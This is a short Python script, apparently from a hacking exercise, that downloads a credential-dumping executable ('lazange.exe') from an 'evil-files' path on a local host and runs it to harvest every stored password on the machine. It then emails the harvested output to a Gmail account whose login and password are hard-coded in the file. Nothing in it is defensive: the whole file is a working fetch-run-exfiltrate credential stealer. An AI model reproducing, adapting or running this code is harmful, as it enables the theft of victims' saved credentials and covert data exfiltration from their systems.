import smtplib, requests, subprocess


def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file: #write, binary
		#executes while file open
		out_file.write(get_response.content)


def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587) # create instance of smtp server
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message) #from, to, message
	server.quit()

download("http://192.168.1.144/evil-files/lazange.exe")
result = subprocess.check_output("lazange.exe all", shell=True)
send_mail("coolandunusualtestserver@gmail.com", "bepis123!", result)